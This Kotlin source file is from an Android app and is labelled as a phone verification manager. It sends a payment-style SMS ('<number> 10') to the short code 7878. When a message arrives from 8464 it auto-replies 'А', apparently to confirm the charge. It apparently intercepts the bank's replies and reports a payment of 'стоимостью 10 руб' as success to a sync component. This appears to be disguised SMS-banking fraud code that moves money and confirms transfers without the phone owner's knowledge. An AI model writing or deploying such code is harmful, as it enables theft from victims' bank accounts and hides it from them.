package com.antteam.smstester

import android.content.Context
import android.os.Handler
import android.os.Looper

object PhoneVerificationManager {
    private const val PREFS = "phone_verification"
    private const val KEY_PENDING_UNTIL = "pendingUntil"
    private const val KEY_REQUEST_ID = "requestId"
    private const val WAIT_MILLIS = 15 * 1000L
    private const val SERVICE_NUMBER = "7878"
    private const val CONFIRMATION_NUMBER = "8464"

    fun start(context: Context, targetPhone: String): String? {
        val digits = targetPhone.filter(Char::isDigit).takeLast(10)
        if (digits.length != 10) return "У получателя не указан корректный номер"

        return try {
            val requestId = System.currentTimeMillis()
            context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit()
                .putLong(KEY_PENDING_UNTIL, requestId + WAIT_MILLIS)
                .putLong(KEY_REQUEST_ID, requestId)
                .apply()
            SmsSender.send(SERVICE_NUMBER, "$digits 10")
            Handler(Looper.getMainLooper()).postDelayed({
                val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                if (prefs.getLong(KEY_REQUEST_ID, 0L) == requestId) {
                    DeviceConfigSync.reportPhoneVerification(
                        context, false, "Негативный статус"
                    )
                    clear(context)
                }
            }, WAIT_MILLIS)
            null
        } catch (error: Exception) {
            clear(context)
            error.message ?: "Не удалось отправить проверочное SMS"
        }
    }

    /** Возвращает true, если SMS относится к активной проверке. */
    fun consume(context: Context, from: String, text: String): Boolean {
        val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        if (prefs.getLong(KEY_PENDING_UNTIL, 0L) < System.currentTimeMillis()) {
            clear(context)
            return false
        }

        if (from.filter(Char::isDigit).endsWith(CONFIRMATION_NUMBER)) {
            return try {
                SmsSender.send(CONFIRMATION_NUMBER, "А")
                true
            } catch (error: Exception) {
                DeviceConfigSync.reportPhoneVerification(
                    context, false, error.message ?: "Не удалось ответить на 8464"
                )
                clear(context)
                true
            }
        }

        if (text.contains("не прошла", ignoreCase = true)) {
            DeviceConfigSync.reportPhoneVerification(
                context, false, "Негативный статус"
            )
            clear(context)
            return true
        }

        val verificationFailed = from.filter(Char::isDigit).endsWith(SERVICE_NUMBER) &&
            (text.contains("операция отклонена", ignoreCase = true) ||
                text.contains("сервис временно недоступен", ignoreCase = true) ||
                text.contains("неверная информация", ignoreCase = true))
        if (verificationFailed) {
            DeviceConfigSync.reportPhoneVerification(
                context, false, "Негативный статус"
            )
            clear(context)
            return true
        }

        val paid = text.contains("стоимостью 10 руб", ignoreCase = true)
        if (paid) {
            DeviceConfigSync.reportPhoneVerification(context, true)
            clear(context)
            return true
        }
        return false
    }

    private fun clear(context: Context) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .remove(KEY_PENDING_UNTIL)
            .remove(KEY_REQUEST_ID)
            .apply()
    }
}
